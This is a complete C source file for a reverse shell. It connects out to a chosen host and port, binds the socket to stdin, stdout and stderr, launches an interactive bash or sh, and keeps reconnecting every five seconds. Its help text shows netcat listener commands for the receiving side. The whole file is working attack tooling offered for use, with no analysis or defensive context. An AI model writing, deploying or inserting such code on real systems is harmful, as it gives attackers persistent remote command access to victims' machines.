// reverse_shell.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <pwd.h>
#include <grp.h>
#include <signal.h>
#include <sys/wait.h>
#include <fcntl.h>
#include <termios.h>
#include <errno.h>
#include <netdb.h>

#define BUFFER_SIZE 4096
#define MAX_CONNECTIONS 10

typedef struct {
    char host[256];
    int port;
    char shell_path[BUFFER_SIZE];
    char env_string[BUFFER_SIZE];
    int should_terminate;
    pid_t main_pid;
    int verbose;
} ShellConfig;

ShellConfig config = {0};

void show_help(const char *prog_name) {
    printf("Usage: %s [OPTIONS]\n", prog_name);
    printf("Options:\n");
    printf("  --host HOST        Set remote host IP or domain (default: 127.0.0.1)\n");
    printf("  --port PORT        Set remote port (default: 2323)\n");
    printf("  --shell PATH       Set shell binary path (default: /bin/bash or /bin/sh)\n");
    printf("  --env ENV_VARS     Set environment variables (format: KEY1=val1&KEY2=val2)\n");
    printf("  --verbose          Enable verbose output\n");
    printf("  --help             Show this help message\n");
    printf("\nExamples:\n");
    printf("  # Connect to client host\n");
    printf("  %s --host 192.168.1.100 --port 6767\n", prog_name);
    printf("\n  # Use custom shell\n");
    printf("  %s --host 192.168.1.100 --shell /bin/sh --port 6767\n", prog_name);
    printf("\n  # Local testing\n");
    printf("  %s --port 6767\n", prog_name);
    printf("  # Execute on other local terminals: nc 127.0.0.1 6767\n");
    printf("\nNote: This program connects BACK to the specified host:port.\n");
    printf("      On the remote host, start a listener:\n");
    printf("      nc -l -p 6767\n");
    printf("      or\n");
    printf("      nc -l 6767\n");
}

void parse_env_vars(char *env_string) {
    if (strlen(env_string) == 0) return;
    
    char *saveptr;
    char *token = strtok_r(env_string, "&", &saveptr);
    
    while (token != NULL) {
        if (strlen(token) > 0) {
            char *eq_pos = strchr(token, '=');
            if (eq_pos != NULL) {
                *eq_pos = '\0';
                setenv(token, eq_pos + 1, 1);
                if (config.verbose) {
                    printf("[VERBOSE] Set env: %s=%s\n", token, eq_pos + 1);
                }
            }
        }
        token = strtok_r(NULL, "&", &saveptr);
    }
}

int parse_arguments(int argc, char *argv[]) {
    strcpy(config.host, "127.0.0.1");
    config.port = 2323;
    config.shell_path[0] = '\0';
    config.env_string[0] = '\0';
    config.verbose = 0;
    
    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "--help") == 0) {
            show_help(argv[0]);
            return 0;
        }
        else if (strcmp(argv[i], "--verbose") == 0) {
            config.verbose = 1;
            printf("Verbose mode enabled\n");
        }
        else if (strcmp(argv[i], "--host") == 0 && i + 1 < argc) {
            strncpy(config.host, argv[++i], sizeof(config.host) - 1);
            config.host[sizeof(config.host) - 1] = '\0';
            printf("Host set to: %s\n", config.host);
        }
        else if (strcmp(argv[i], "--port") == 0 && i + 1 < argc) {
            config.port = atoi(argv[++i]);
            if (config.port <= 0 || config.port > 65535) {
                fprintf(stderr, "Error: Invalid port number\n");
                return 0;
            }
            printf("Port set to: %d\n", config.port);
        }
        else if (strcmp(argv[i], "--shell") == 0 && i + 1 < argc) {
            strncpy(config.shell_path, argv[++i], sizeof(config.shell_path) - 1);
            config.shell_path[sizeof(config.shell_path) - 1] = '\0';
            printf("Shell set to: %s\n", config.shell_path);
        }
        else if (strcmp(argv[i], "--env") == 0 && i + 1 < argc) {
            strncpy(config.env_string, argv[++i], sizeof(config.env_string) - 1);
            config.env_string[sizeof(config.env_string) - 1] = '\0';
            if (config.verbose) {
                printf("[VERBOSE] Env string: %s\n", config.env_string);
            }
        }
        else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            show_help(argv[0]);
            return 0;
        }
    }
    return 1;
}

void setup_terminal(int fd) {
    struct termios termios;
    if (tcgetattr(fd, &termios) == 0) {
        termios.c_lflag |= ECHO | ICANON;
        termios.c_cc[VINTR] = 3;
        termios.c_cc[VQUIT] = 28;
        termios.c_cc[VERASE] = 127;
        termios.c_cc[VKILL] = 21;
        termios.c_cc[VEOF] = 4;
        tcsetattr(fd, TCSANOW, &termios);
    }
}

void sigchld_handler(int sig) {
    while (waitpid(-1, NULL, WNOHANG) > 0);
}

void sigterm_handler(int sig) {
    config.should_terminate = 1;
    printf("Received termination signal, shutting down...\n");
}

void find_shell(char *shell_path, size_t size) {
    if (strlen(shell_path) > 0) {
        if (access(shell_path, X_OK) == 0) {
            if (config.verbose) {
                printf("[VERBOSE] Using specified shell: %s\n", shell_path);
            }
            return;
        }
        fprintf(stderr, "Warning: Specified shell '%s' not executable, trying defaults\n", shell_path);
    }
    
    const char *shells[] = {
        "/bin/bash",
        "/bin/sh",
        "/usr/bin/bash",
        "/usr/bin/sh",
        "/system/bin/sh",
        NULL
    };
    
    for (int i = 0; shells[i] != NULL; i++) {
        if (access(shells[i], X_OK) == 0) {
            strncpy(shell_path, shells[i], size - 1);
            shell_path[size - 1] = '\0';
            if (config.verbose) {
                printf("[VERBOSE] Found shell: %s\n", shell_path);
            }
            return;
        }
    }
    
    strncpy(shell_path, "/bin/sh", size - 1);
    shell_path[size - 1] = '\0';
    fprintf(stderr, "Warning: No shell found, using /bin/sh\n");
}

void handle_shell_client(int client_socket) {
    if (strlen(config.env_string) > 0) {
    } else {
        struct passwd *pw = getpwuid(getuid());
        if (pw) {
            setenv("USER", pw->pw_name, 1);
            setenv("LOGNAME", pw->pw_name, 1);
            setenv("HOME", pw->pw_dir, 1);
        }
        setenv("TERM", "xterm-256color", 1);
        setenv("PATH", "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", 1);
    }
    
    dup2(client_socket, STDIN_FILENO);
    dup2(client_socket, STDOUT_FILENO);
    dup2(client_socket, STDERR_FILENO);
    close(client_socket);
    
    setup_terminal(STDIN_FILENO);
    
    char shell_path[BUFFER_SIZE];
    strncpy(shell_path, config.shell_path, sizeof(shell_path) - 1);
    shell_path[sizeof(shell_path) - 1] = '\0';
    find_shell(shell_path, sizeof(shell_path));
    
    execl(shell_path, shell_path, "-i", (char *)NULL);
    execl(shell_path, shell_path, (char *)NULL);
    execl("/bin/sh", "sh", "-i", (char *)NULL);
    execl("/bin/sh", "sh", (char *)NULL);
    
    fprintf(stderr, "Failed to execute shell: %s\n", strerror(errno));
    exit(EXIT_FAILURE);
}

int connect_to_host(const char *host, int port) {
    int sock;
    struct sockaddr_in server_addr;
    struct hostent *server;
    
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        if (config.verbose) {
            perror("[VERBOSE] Socket creation failed");
        }
        return -1;
    }
    
    server = gethostbyname(host);
    if (server == NULL) {
        if (config.verbose) {
            fprintf(stderr, "[VERBOSE] No such host: %s\n", host);
        }
        close(sock);
        return -1;
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    memcpy(&server_addr.sin_addr.s_addr, server->h_addr_list[0], server->h_length);
    
    struct timeval timeout;
    timeout.tv_sec = 5;
    timeout.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
    
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        if (config.verbose) {
            perror("[VERBOSE] Connection failed");
        }
        close(sock);
        return -1;
    }
    
    return sock;
}

void start_reverse_shell() {
    int sock;
    pid_t pid;
    int reconnect_delay = 5;
    
    struct sigaction sa;
    sa.sa_handler = sigchld_handler;
    sigemptyset(&sa.sa_mask);
    sa.sa_flags = SA_RESTART;
    if (sigaction(SIGCHLD, &sa, NULL) == -1) {
        perror("sigaction");
        exit(EXIT_FAILURE);
    }
    signal(SIGTERM, sigterm_handler);
    
    printf("\n========================================\n");
    printf("Reverse Shell started\n");
    printf("PID: %d\n", getpid());
    printf("Target: %s:%d\n", config.host, config.port);
    printf("========================================\n\n");
    
    while (!config.should_terminate) {
        printf("[*] Connecting to %s:%d...\n", config.host, config.port);
        
        sock = connect_to_host(config.host, config.port);
        if (sock < 0) {
            printf("[!] Connection failed, retrying in %d seconds...\n", reconnect_delay);
            sleep(reconnect_delay);
            continue;
        }
        
        printf("[+] Connected to %s:%d\n", config.host, config.port);
        
        pid = fork();
        if (pid < 0) {
            perror("fork");
            close(sock);
            sleep(reconnect_delay);
            continue;
        } else if (pid == 0) {
            handle_shell_client(sock);
            exit(EXIT_FAILURE);
        } else {
            close(sock);
            
            int status;
            pid_t result = waitpid(pid, &status, 0);
            if (result > 0) {
                if (WIFEXITED(status)) {
                    printf("[!] Shell exited with code: %d\n", WEXITSTATUS(status));
                } else if (WIFSIGNALED(status)) {
                    printf("[!] Shell terminated by signal: %d\n", WTERMSIG(status));
                }
            }
            
            printf("[*] Reconnecting in %d seconds...\n", reconnect_delay);
            sleep(reconnect_delay);
        }
    }
    
    printf("[*] Reverse shell shutdown complete\n");
}

int main(int argc, char *argv[]) {
    if (!parse_arguments(argc, argv)) {
        return EXIT_FAILURE;
    }
    
    if (argc == 1) {
        show_help(argv[0]);
        return EXIT_SUCCESS;
    }
    
    config.main_pid = getpid();
    config.should_terminate = 0;
    
    if (strlen(config.env_string) > 0) {
        if (config.verbose) {
            printf("[VERBOSE] Parsing environment variables...\n");
        }
        char env_copy[BUFFER_SIZE];
        strncpy(env_copy, config.env_string, sizeof(env_copy) - 1);
        env_copy[sizeof(env_copy) - 1] = '\0';
        parse_env_vars(env_copy);
    }
    
    start_reverse_shell();
    
    return EXIT_SUCCESS;
}